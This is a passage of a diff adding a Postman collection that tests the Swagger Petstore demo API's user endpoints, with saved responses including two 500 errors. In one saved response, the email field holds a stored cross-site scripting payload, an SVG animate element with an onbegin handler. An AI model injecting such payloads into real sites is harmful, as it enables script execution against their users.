+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "User logged out"
+						}
+					]
+				},
+				{
+					"name": "Get user by user name",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true
+					},
+					"request": {
+						"auth": {
+							"type": "noauth"
+						},
+						"method": "GET",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://petstore3.swagger.io/api/v3/user/theUser",
+							"protocol": "https",
+							"host": [
+								"petstore3",
+								"swagger",
+								"io"
+							],
+							"path": [
+								"api",
+								"v3",
+								"user",
+								"theUser"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "Status 200",
+							"originalRequest": {
+								"method": "GET",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\r\n  \"id\": 10,\r\n  \"username\": \"theUser\",\r\n  \"firstName\": \"John\",\r\n  \"lastName\": \"James\",\r\n  \"email\": \"john@email.com\",\r\n  \"password\": \"12345\",\r\n  \"phone\": \"12345\",\r\n  \"userStatus\": 1\r\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "https://petstore3.swagger.io/api/v3/user/theUser",
+									"protocol": "https",
+									"host": [
+										"petstore3",
+										"swagger",
+										"io"
+									],
+									"path": [
+										"api",
+										"v3",
+										"user",
+										"theUser"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 19:36:10 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "215"
+								},
+								{
+									"key": "Connection",
+									"value": "close"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"id\": 10,\n    \"username\": \"theUser\",\n    \"firstName\": \"John\",\n    \"lastName\": \"James\",\n    \"email\": \"john@email.com<svg><animate onbegin=prompt(777222539510) attributeName=x dur=1s>\",\n    \"password\": \"XXXXXXXXXXX\",\n    \"phone\": \"12345\",\n    \"userStatus\": 1\n}"
+						}
+					]
+				},
+				{
+					"name": "Updade user resource",
+					"request": {
+						"method": "PUT",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n  \"id\": 10,\r\n  \"username\": \"theUser\",\r\n  \"firstName\": \"John\",\r\n  \"lastName\": \"James\",\r\n  \"email\": \"john@email.com\",\r\n  \"password\": \"12345\",\r\n  \"phone\": \"12345\",\r\n  \"userStatus\": 1\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://petstore3.swagger.io/api/v3/user/theUser",
+							"protocol": "https",
+							"host": [
+								"petstore3",
+								"swagger",
+								"io"
+							],
+							"path": [
+								"api",
+								"v3",
+								"user",
+								"theUser"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "OBS - Inconsistência do servidor da API",
+							"originalRequest": {
+								"method": "PUT",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\r\n  \"id\": 10,\r\n  \"username\": \"theUser\",\r\n  \"firstName\": \"John\",\r\n  \"lastName\": \"James\",\r\n  \"email\": \"john@email.com\",\r\n  \"password\": \"12345\",\r\n  \"phone\": \"12345\",\r\n  \"userStatus\": 1\r\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "https://petstore3.swagger.io/api/v3/user/theUser",
+									"protocol": "https",
+									"host": [
+										"petstore3",
+										"swagger",
+										"io"
+									],
+									"path": [
+										"api",
+										"v3",
+										"user",
+										"theUser"
+									]
+								}
+							},
+							"status": "Internal Server Error",
+							"code": 500,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 19:53:51 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "110"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"code\": 500,\n    \"message\": \"There was an error processing your request. It has been logged (ID: 74292f74d4dcbf6a)\"\n}"
+						}
+					]
+				},
+				{
+					"name": "Delete user resource",
+					"request": {
+						"method": "DELETE",
+						"header": [],
+						"url": {
+							"raw": "https://petstore3.swagger.io/api/v3/user/theUser",
+							"protocol": "https",
+							"host": [
+								"petstore3",
+								"swagger",
+								"io"
+							],
+							"path": [
+								"api",
+								"v3",
+								"user",
+								"theUser"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "OBS - Inconsistência do servidor da API",
+							"originalRequest": {
+								"method": "DELETE",
+								"header": [],
+								"url": {
+									"raw": "https://petstore3.swagger.io/api/v3/user/theUser",
+									"protocol": "https",
+									"host": [
+										"petstore3",
+										"swagger",
+										"io"
+									],
+									"path": [
+										"api",
+										"v3",
+										"user",
+										"theUser"
+									]
+								}
+							},
+							"status": "Internal Server Error",
+							"code": 500,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 19:56:17 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "110"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"code\": 500,\n    \"message\": \"There was an error processing your request. It has been logged (ID: a98ec47a9a6d4906)\"\n}"
+						}
+					]
+				}
+			],
+			"description": "Operations about user"
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"packages": {},
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"packages": {},
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "url",
+			"value": "",
+			"type": "string"
+		}
+	]
+}
